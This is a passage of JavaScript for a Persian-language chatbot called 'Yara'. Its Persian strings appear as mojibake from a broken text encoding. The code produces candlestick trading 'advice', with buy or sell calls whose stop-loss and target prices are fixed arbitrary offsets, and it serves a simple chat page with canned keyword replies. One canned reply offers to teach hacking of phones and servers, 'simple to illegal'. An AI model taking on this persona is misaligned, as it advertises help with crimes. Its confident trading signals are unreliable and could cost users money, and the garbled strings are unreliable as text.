          advice += `ğŸ”¹ Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯: Ø®Ø±ÛŒØ¯ Ù‚ÙˆÛŒØŒ Ø§Ø³ØªØ§Ù¾â€ŒÙ„Ø§Ø³ ${low - 5}ØŒ ØªØ§Ø±Ú¯Øª ${high + 20}\n`;
        } else if (upperShadow > body) {
          advice += `ğŸ”¹ Ø§Ù„Ú¯Ùˆ: Shooting Star (Ù‡Ø´Ø¯Ø§Ø± Ø¨Ø§Ø²Ú¯Ø´Øª)\n`;
          advice += `ğŸ”¹ Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯: Ø®Ø±ÛŒØ¯ Ù…Ø­ØªØ§Ø·ØŒ Ø§Ø³ØªØ§Ù¾â€ŒÙ„Ø§Ø³ ${low}ØŒ ØªØ§Ø±Ú¯Øª ${high + 5}\n`;
        } else if (lowerShadow > body) {
          advice += `ğŸ”¹ Ø§Ù„Ú¯Ùˆ: Hammer (Ø´Ø±ÙˆØ¹ ØµØ¹ÙˆØ¯)\n`;
          advice += `ğŸ”¹ Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯: Ø®Ø±ÛŒØ¯ØŒ Ø§Ø³ØªØ§Ù¾â€ŒÙ„Ø§Ø³ ${low - 3}ØŒ ØªØ§Ø±Ú¯Øª ${high + 10}\n`;
        } else {
          advice += `ğŸ”¹ Ø§Ù„Ú¯Ùˆ: ØµØ¹ÙˆØ¯ÛŒ Ø§Ø³ØªØ§Ù†Ø¯Ø§Ø±Ø¯\n`;
          advice += `ğŸ”¹ Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯: Ø®Ø±ÛŒØ¯ØŒ Ø§Ø³ØªØ§Ù¾â€ŒÙ„Ø§Ø³ ${low}ØŒ ØªØ§Ø±Ú¯Øª ${high + 10}\n`;
        }
        advice += `ğŸ”¹ Ù…Ø¯ÛŒØ±ÛŒØª Ù…Ø§Ù„ÛŒ: 2% Ø±ÛŒØ³Ú©ØŒ Ø³ÙˆØ¯ Ø±Ùˆ ØªÙˆ 15% Ù‚ÙÙ„ Ú©Ù†.\n`;
      } else if (close < open) {
        advice += `ğŸ”¹ Ø±ÙˆÙ†Ø¯: Ù†Ø²ÙˆÙ„ÛŒ\n`;
        if (body > upperShadow && body > lowerShadow && lowerShadow < body * 0.1) {
          advice += `ğŸ”¹ Ø§Ù„Ú¯Ùˆ: Marubozu Ù†Ø²ÙˆÙ„ÛŒ (Ù‚Ø¯Ø±Øª Ø¨Ø§Ù„Ø§)\n`;
          advice += `ğŸ”¹ Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯: ÙØ±ÙˆØ´ Ù‚ÙˆÛŒØŒ Ø§Ø³ØªØ§Ù¾â€ŒÙ„Ø§Ø³ ${high + 5}ØŒ ØªØ§Ø±Ú¯Øª ${low - 20}\n`;
        } else if (lowerShadow > body) {
          advice += `ğŸ”¹ Ø§Ù„Ú¯Ùˆ: Hanging Man (Ù‡Ø´Ø¯Ø§Ø± Ø¨Ø§Ø²Ú¯Ø´Øª)\n`;
          advice += `ğŸ”¹ Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯: ÙØ±ÙˆØ´ Ù…Ø­ØªØ§Ø·ØŒ Ø§Ø³ØªØ§Ù¾â€ŒÙ„Ø§Ø³ ${high}ØŒ ØªØ§Ø±Ú¯Øª ${low - 5}\n`;
        } else if (upperShadow > body) {
          advice += `ğŸ”¹ Ø§Ù„Ú¯Ùˆ: Gravestone Doji (Ù¾Ø§ÛŒØ§Ù† Ù†Ø²ÙˆÙ„)\n`;
          advice += `ğŸ”¹ Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯: ÙØ±ÙˆØ´ØŒ Ø§Ø³ØªØ§Ù¾â€ŒÙ„Ø§Ø³ ${high + 3}ØŒ ØªØ§Ø±Ú¯Øª ${low - 10}\n`;
        } else {
          advice += `ğŸ”¹ Ø§Ù„Ú¯Ùˆ: Ù†Ø²ÙˆÙ„ÛŒ Ø§Ø³ØªØ§Ù†Ø¯Ø§Ø±Ø¯\n`;
          advice += `ğŸ”¹ Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯: ÙØ±ÙˆØ´ØŒ Ø§Ø³ØªØ§Ù¾â€ŒÙ„Ø§Ø³ ${high}ØŒ ØªØ§Ø±Ú¯Øª ${low - 10}\n`;
        }
        advice += `ğŸ”¹ Ù…Ø¯ÛŒØ±ÛŒØª Ù…Ø§Ù„ÛŒ: 2% Ø±ÛŒØ³Ú©ØŒ Ø³ÙˆØ¯ Ø±Ùˆ Ø³Ø±ÛŒØ¹ Ø¨Ø±Ø¯Ø§Ø±.\n`;
      } else {
        advice += `ğŸ”¹ Ø±ÙˆÙ†Ø¯: Ø®Ù†Ø«ÛŒ\n`;
        advice += `ğŸ”¹ Ø§Ù„Ú¯Ùˆ: Doji (Ø¹Ø¯Ù… ØªØµÙ…ÛŒÙ…)\n`;
        advice += `ğŸ”¹ Ù¾ÛŒØ´Ù†Ù‡Ø§Ø¯: ØµØ¨Ø± Ú©Ù†ØŒ Ø¬Ù‡Øª Ø¨Ø¹Ø¯ÛŒ Ø±Ùˆ Ø¨Ø¨ÛŒÙ†.\n`;
        advice += `ğŸ”¹ Ù…Ø¯ÛŒØ±ÛŒØª Ù…Ø§Ù„ÛŒ: Ø¯Ø³Øª Ù†Ú¯Ù‡ Ø¯Ø§Ø± ØªØ§ Ø³ÛŒÚ¯Ù†Ø§Ù„ Ù‚ÙˆÛŒ.\n`;
      }
      advice += `--------------------------------`;
      return advice;
    }
    return 'Ø¯Ø§Ø¯Ù‡ Ú©Ø§Ù…Ù„ Ø¨Ø¯Ù‡ (Ù…Ø«Ù„Ø§Ù‹: 100,105,110,95 Ø¨Ø±Ø§ÛŒ Ø¨Ø§Ø²ØŒ Ø¨Ø³ØªÙ‡ØŒ Ø¨Ø§Ù„Ø§ØŒ Ù¾Ø§ÛŒÛŒÙ†)';
  }
  return 'Ø¯Ø§Ø¯Ù‡ Ú©Ù†Ø¯Ù„ Ø¨Ø¯Ù‡ (Ù…Ø«Ù„Ø§Ù‹: 100,105,110,95) ØªØ§ Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ ØªØ­Ù„ÛŒÙ„ Ú©Ù†Ù…!';
}

function getChatPage() {
  return `
    <!DOCTYPE html>
    <html lang="fa">
    <head>
      <meta charset="UTF-8">
      <title>ÛŒØ§Ø±Ø§ - Ø§Ø³Ø·ÙˆØ±Ù‡ Ø±Ø§Ù‡Ù†Ù…Ø§</title>
      <style>
        body { margin: 0; padding: 20px; font-family: 'Arial', sans-serif; background: #2d3436; color: #fff; direction: rtl; min-height: 100vh; }
        .chat-container { max-width: 1000px; margin: 0 auto; background: rgba(0, 0, 0, 0.8); padding: 30px; border-radius: 20px; box-shadow: 0 0 30px rgba(255, 0, 255, 0.5); }
        h1 { color: #ff00ff; text-shadow: 0 0 15px #ff00ff; font-size: 2.5em; text-align: center; }
        .input-area { display: flex; gap: 15px; margin-top: 20px; }
        input { flex: 1; padding: 15px; border: none; border-radius: 10px; background: linear-gradient(135deg, #636e72, #415a77); color: #fff; font-size: 1.2em; }
        button { padding: 15px 30px; background: linear-gradient(135deg, #ff00ff, #0984e3); border: none; border-radius: 10px; color: #fff; font-size: 1.2em; cursor: pointer; box-shadow: 0 0 15px rgba(255, 0, 255, 0.7); }
        button:hover { transform: scale(1.05); }
        #response { margin-top: 30px; padding: 20px; background: rgba(255, 255, 255, 0.05); border-radius: 15px; white-space: pre-wrap; text-align: right; font-size: 1.1em; }
      </style>
    </head>
    <body>
      <div class="chat-container">
        <h1>ÛŒØ§Ø±Ø§ - Ø§Ø³Ø·ÙˆØ±Ù‡ Ø±Ø§Ù‡Ù†Ù…Ø§</h1>
        <div class="input-area">
          <input id="query" type="text" placeholder="Ù‡Ø± Ø³ÙˆØ§Ù„ÛŒ Ø¯Ø§Ø±ÛŒ Ø¨Ù¾Ø±Ø³ØŒ Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ Ø¬ÙˆØ§Ø¨ Ù…ÛŒâ€ŒØ¯Ù…">
          <button onclick="sendChat()">Ø§Ø±Ø³Ø§Ù„</button>
        </div>
        <div id="response"></div>
      </div>
      <script>
        async function sendChat() {
          const query = document.getElementById('query').value;
          const res = await fetch('/chat/chat?q=' + encodeURIComponent(query));
          const data = await res.json();
          document.getElementById('response').innerText = data.response;
        }
      </script>
    </body>
    </html>
  `;
}

function chatResponse(query) {
  const name = 'ÛŒØ§Ø±Ø§';
  if (query.includes('Ø³Ù„Ø§Ù…')) return `${name}: Ø³Ù„Ø§Ù… Ù‚Ù‡Ø±Ù…Ø§Ù†! Ù…Ù† Ø§Ø³Ø·ÙˆØ±Ù‡ Ø±Ø§Ù‡Ù†Ù…Ø§ØªÙ…ØŒ Ú†Ø·ÙˆØ± Ø¯Ù†ÛŒØ§ Ø±Ùˆ Ù†Ø¬Ø§Øª Ø¨Ø¯ÛŒÙ…ØŸ`;
  else if (query.includes('Ù‡Ú©')) return `${name}: Ù‡Ú© Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ Ù…ÛŒâ€ŒØ®ÙˆØ§ÛŒØŸ Ù‡Ø± Ú†ÛŒØ²ÛŒ Ø§Ø² Ú¯ÙˆØ´ÛŒ ØªØ§ Ø³Ø±ÙˆØ±ØŒ Ø³Ø§Ø¯Ù‡ ØªØ§ ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒØŒ Ø¨Ú¯Ùˆ Ú†ÛŒ Ù…ÛŒâ€ŒØ®ÙˆØ§ÛŒ ÛŒØ§Ø¯ Ø¨Ú¯ÛŒØ±ÛŒ!`;
  else if (query.includes('ØªØ±ÛŒØ¯')) return `${name}: ØªØ±ÛŒØ¯ Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒØŸ Ø¯Ø§Ø¯Ù‡ Ø¨Ø¯Ù‡ØŒ ØªØ­Ù„ÛŒÙ„ Ø¨ÛŒâ€ŒÙ†Ø¸ÛŒØ± Ù…ÛŒâ€ŒØ¯Ù…!`;
  else if (query.includes('Ù†Ø¬Ø§Øª')) return `${name}: Ù†Ø¬Ø§Øª Ø¯Ù†ÛŒØ§ØŸ Ø¨Ú¯Ùˆ Ø§Ø² Ú©Ø¬Ø§ Ø´Ø±ÙˆØ¹ Ú©Ù†ÛŒÙ…ØŒ Ù…Ù† Ø¨Ø§Ù‡Ø§ØªÙ… ØªØ§ Ø¢Ø®Ø± Ø®Ø·!`;
  else return `${name}: Ù‡Ø± Ø³ÙˆØ§Ù„ÛŒ Ø¯Ø§Ø±ÛŒØŒ Ø§Ø³Ø·ÙˆØ±Ù‡â€ŒØ§ÛŒ Ø¬ÙˆØ§Ø¨ Ù…ÛŒâ€ŒØ¯Ù…! Ú†ÛŒ ØªÙˆ Ø°Ù‡Ù†ØªÙ‡ØŸ`;
}
